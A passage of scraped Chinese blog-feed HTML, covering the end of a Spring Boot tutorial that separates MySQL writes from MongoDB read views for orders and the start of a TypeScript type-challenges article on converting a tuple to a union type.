<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data JPA --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- MySQL Connector --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.26<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- HikariCP for Connection Pooling --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.zaxxer<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>HikariCP<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot Starter Web --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Spring Boot Starter Data MongoDB --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-mongodb<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- Lombok --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.18.20<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<h3 data-id="heading-1">2. 配置数据源和属性</h3>
<p>在<code>application.properties</code>中配置MySQL和MongoDB数据源：</p>
<pre><code class="hljs language-properties" lang="properties"># MySQL Database Configuration
spring.datasource.url=jdbc:mysql://localhost:3306/mydatabase
spring.datasource.username=root
spring.datasource.password=rootpassword
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver

spring.jpa.hibernate.ddl-auto=update
spring.jpa.show-sql=true
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect

# MongoDB Configuration
spring.data.mongodb.host=localhost
spring.data.mongodb.port=27017
spring.data.mongodb.database=myquerydatabase
</code></pre>
<h3 data-id="heading-2">3. 创建领域模型</h3>
<h4 data-id="heading-3">使用MySQL的实体类和仓储接口</h4>
<h5 data-id="heading-4"><code>Order.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.ArrayList;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Order</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;

    <span class="hljs-meta">@OneToMany(cascade = CascadeType.ALL, orphanRemoval = true)</span>
    <span class="hljs-meta">@JoinColumn(name = "order_id")</span>
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addItem</span><span class="hljs-params">(OrderItem item)</span> {
        items.add(item);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeItem</span><span class="hljs-params">(OrderItem item)</span> {
        items.remove(item);
    }

    <span class="hljs-comment">// Business logic methods</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">calculateTotalPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> items.stream().mapToDouble(OrderItem::getTotalPrice).sum();
    }
}
</code></pre>
<h5 data-id="heading-5"><code>OrderItem.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "order_items")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderItem</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;
    <span class="hljs-keyword">private</span> String product;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> quantity;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> price;

    <span class="hljs-keyword">public</span> <span class="hljs-type">double</span> <span class="hljs-title function_">getTotalPrice</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> quantity * price;
    }
}
</code></pre>
<h5 data-id="heading-6"><code>OrderRepository.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">JpaRepository</span>&lt;Order, Long&gt; {
}
</code></pre>
<h4 data-id="heading-7">使用MongoDB的实体类和仓储接口</h4>
<h5 data-id="heading-8"><code>OrderView.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> org.springframework.data.annotation.Id;
<span class="hljs-keyword">import</span> org.springframework.data.mongodb.core.mapping.Document;

<span class="hljs-meta">@Data</span>
<span class="hljs-meta">@Document(collection = "orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderView</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-keyword">private</span> String id;
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> totalPrice;
}
</code></pre>
<h5 data-id="heading-9"><code>OrderViewRepository.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.mongodb.repository.MongoRepository;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">OrderViewRepository</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">MongoRepository</span>&lt;OrderView, String&gt; {
}
</code></pre>
<h3 data-id="heading-10">4. 创建服务层</h3>
<h4 data-id="heading-11">写操作服务（Command Service）</h4>
<h5 data-id="heading-12"><code>OrderCommandService.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCommandService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderRepository orderRepository;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderViewRepository orderViewRepository;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">createOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">savedOrder</span> <span class="hljs-operator">=</span> orderRepository.save(order);
        syncOrderView(savedOrder);
        <span class="hljs-keyword">return</span> savedOrder;
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> Order <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderRepository.save(order);
        syncOrderView(updatedOrder);
        <span class="hljs-keyword">return</span> updatedOrder;
    }

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(Long id)</span> {
        orderRepository.deleteById(id);
        orderViewRepository.deleteById(id.toString());
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">syncOrderView</span><span class="hljs-params">(Order order)</span> {
        <span class="hljs-type">OrderView</span> <span class="hljs-variable">orderView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderView</span>();
        orderView.setId(order.getId().toString());
        orderView.setCustomerName(order.getCustomerName());
        orderView.setCustomerAddress(order.getCustomerAddress());
        orderView.setTotalPrice(order.calculateTotalPrice());
        orderViewRepository.save(orderView);
    }
}
</code></pre>
<h4 data-id="heading-13">读操作服务（Query Service）</h4>
<h5 data-id="heading-14"><code>OrderQueryService.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.util.List;
<span class="hljs-keyword">import</span> java.util.Optional;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderQueryService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderViewRepository orderViewRepository;

    <span class="hljs-keyword">public</span> List&lt;OrderView&gt; <span class="hljs-title function_">getAllOrders</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> orderViewRepository.findAll();
    }

    <span class="hljs-keyword">public</span> Optional&lt;OrderView&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(String id)</span> {
        <span class="hljs-keyword">return</span> orderViewRepository.findById(id);
    }
}
</code></pre>
<h3 data-id="heading-15">5. 创建控制器</h3>
<h4 data-id="heading-16">写操作控制器（Command Controller）</h4>
<h5 data-id="heading-17"><code>OrderCommandController.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/orders")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderCommandController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderCommandService orderCommandService;

    <span class="hljs-meta">@PostMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> CreateOrderRequest request)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setCustomerName(request.getCustomerName());
        order.setCustomerAddress(request.getCustomerAddress());
        order.getItems().addAll(request.getItems());
        <span class="hljs-type">Order</span> <span class="hljs-variable">createdOrder</span> <span class="hljs-operator">=</span> orderCommandService.createOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(createdOrder);
    }

    <span class="hljs-meta">@PutMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Order&gt; <span class="hljs-title function_">updateOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id, <span class="hljs-meta">@RequestBody</span> UpdateOrderRequest request)</span> {
        <span class="hljs-type">Order</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Order</span>();
        order.setId(id);
        order.setCustomerName(request.getCustomerName());
        order.setCustomerAddress(request.getCustomerAddress());
        order.getItems().addAll(request.getItems());
        <span class="hljs-type">Order</span> <span class="hljs-variable">updatedOrder</span> <span class="hljs-operator">=</span> orderCommandService.updateOrder(order);
        <span class="hljs-keyword">return</span> ResponseEntity.ok(updatedOrder);
    }

    <span class="hljs-meta">@DeleteMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;Void&gt; <span class="hljs-title function_">deleteOrder</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
        orderCommandService.deleteOrder(id);
        <span class="hljs-keyword">return</span> ResponseEntity.noContent().build();
    }
}
</code></pre>
<h4 data-id="heading-18">读操作控制器（Query Controller）</h4>
<h5 data-id="heading-19"><code>OrderQueryController.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.http.ResponseEntity;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/order-views")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderQueryController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> OrderQueryService orderQueryService;

    <span class="hljs-meta">@GetMapping</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;List&lt;OrderView&gt;&gt; <span class="hljs-title function_">getAllOrders</span><span class="hljs-params">()</span> {
        List&lt;OrderView&gt; orders = orderQueryService.getAllOrders();
        <span class="hljs-keyword">return</span> ResponseEntity.ok(orders);
    }

    <span class="hljs-meta">@GetMapping("/{id}")</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;OrderView&gt; <span class="hljs-title function_">getOrderById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String id)</span> {
        <span class="hljs-keyword">return</span> orderQueryService.getOrderById(id)
                .map(ResponseEntity::ok)
                .orElse(ResponseEntity.notFound().build());
    }
}
</code></pre>
<h4 data-id="heading-20">请求对象</h4>
<h5 data-id="heading-21"><code>CreateOrderRequest.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateOrderRequest</span> {
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items;
}
</code></pre>
<h5 data-id="heading-22"><code>UpdateOrderRequest.java</code></h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@Data</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UpdateOrderRequest</span> {
    <span class="hljs-keyword">private</span> String customerName;
    <span class="hljs-keyword">private</span> String customerAddress;
    <span class="hljs-keyword">private</span> List&lt;OrderItem&gt; items;
}
</code></pre>
<h3 data-id="heading-23">6. 运行应用</h3>
<ol>
<li><strong>启动MySQL</strong>：确保你的MySQL数据库运行在<code>localhost:3306</code>。</li>
<li><strong>创建数据库</strong>：创建一个名为<code>mydatabase</code>的数据库。</li>
<li><strong>启动MongoDB</strong>：确保MongoDB数据库运行在<code>localhost:27017</code>。</li>
<li><strong>启动Spring Boot应用</strong>：运行Spring Boot应用程序。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[type-challenges（ts类型体操）: 10 - 元组转合集]]></title>    <link>https://juejin.cn/post/7600955777316241446</link>    <guid>https://juejin.cn/post/7600955777316241446</guid>    <pubDate>2026-01-30T15:13:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777316241446" data-draft-id="7601028900885987374" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="type-challenges（ts类型体操）: 10 - 元组转合集"/> <meta itemprop="keywords" content="TypeScript"/> <meta itemprop="datePublished" content="2026-01-30T15:13:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="fxss"/> <meta itemprop="url" content="https://juejin.cn/user/3702810892856808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            type-challenges（ts类型体操）: 10 - 元组转合集
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3702810892856808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    fxss
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:13:53.000Z" title="Fri Jan 30 2026 15:13:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">10 - 元组转合集</h2>
<p>by Anthony Fu (@antfu) #中等 #infer #tuple #union</p>
<h3 data-id="heading-1">题目</h3>
<p>实现泛型<code>TupleToUnion&lt;T&gt;</code>，它返回元组所有值的合集。</p>
<p>例如</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">type</span> <span class="hljs-title class_">Arr</span> = [<span class="hljs-string">'1'</span>, <span class="hljs-string">'2'</span>, <span class="hljs-string">'3'</span>]

<span class="hljs-keyword">type</span> <span class="hljs-title class_">Test</span> = <span class="hljs-title class_">TupleToUnion</span>&lt;<span class="hljs-title class_">Arr</span>&gt; <span class="hljs-comment">// expected to be '1' | '2' | '3'</span>
</code></pre>
<blockquote>
<p>在 Github 上查看：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftsch.js.org%2F10%2Fzh-CN" target="_blank" title="https://tsch.js.org/10/zh-CN" ref="nofollow noopener noreferrer">tsch.js.org/10/zh-CN</a></p>
</blockquote>
<h3 data-id="heading-2">代码</h3>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">/* _____________ 你的代码 _____________ */</span>

<span class="hljs-keyword">type</span> <span class="hljs-title class_">TupleToUnion</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> [infer F, ...infer R] ? F | <span class="hljs-title class_">TupleToUnion</span>&lt;R&gt; : <span class="hljs-built_in">never</span>

</code></pre>
<p>关键解释：</p>
<ul>
<li><code>T extends [infer F, ...infer R]</code> 用于判断元组是否为空。</li>
<li><code>F | TupleToUnion&lt;R&gt;</code> 用于递归处理元组的剩余部分。</li>
<li><code>never</code> 用于处理空元组的情况。</li>
</ul>
<h3 data-id="heading-3">相关知识点</h3>
<h4 data-id="heading-4"><code>extends</code></h4>




















<table><thead><tr><th>使用维度</th><th>核心作用</th><th>示例场景</th></tr></thead><tbody><tr><td>类型维度</td><td>做类型约束或条件判断（类型编程核心）</td><td>限定泛型范围、判断类型是否兼容、提取类型片段</td></tr><tr><td>语法维度</td><td>做继承（复用已有结构）</td><td>接口继承、类继承</td></tr></tbody></table>
<h5 data-id="heading-5"><code>extends</code> 做类型约束或条件判断</h5>
<ol>
<li>泛型约束：限定泛型的取值范围</li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 约束 T 必须是「拥有 length 属性」的类型（比如 string/数组）</span>
<span class="hljs-keyword">function</span> getLength&lt;T <span class="hljs-keyword">extends</span> { <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span> }&gt;(<span class="hljs-attr">arg</span>: T): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> arg.<span class="hljs-property">length</span>;
}

<span class="hljs-comment">// 合法调用（符合约束）</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-string">"hello"</span>); <span class="hljs-comment">// ✅ string 有 length，返回 5</span>
<span class="hljs-title function_">getLength</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]); <span class="hljs-comment">// ✅ 数组有 length，返回 3</span>

<span class="hljs-comment">// 非法调用（超出约束）</span>
<span class="hljs-title function_">getLength</span>(<span class="hljs-number">123</span>); <span class="hljs-comment">// ❌ 报错：number 没有 length 属性</span>
</code></pre>
<ol start="2">
<li>条件类型：类型版 <strong>三元运算符</strong></li>
</ol>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-comment">// 基础示例：判断类型是否为字符串</span>
<span class="hljs-keyword">type</span> <span class="hljs-title class_">IsString</span>&lt;T&gt; = T <span class="hljs-keyword">extends</span> <span class="hljs-built_in">string</span> ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;

<span class="hljs-keyword">type</span> A = <span class="hljs-title class_">IsString</span>&lt;<span class="hljs-string">"test"</span>&gt;; <span class="hljs-comment">// true（符合）</span>
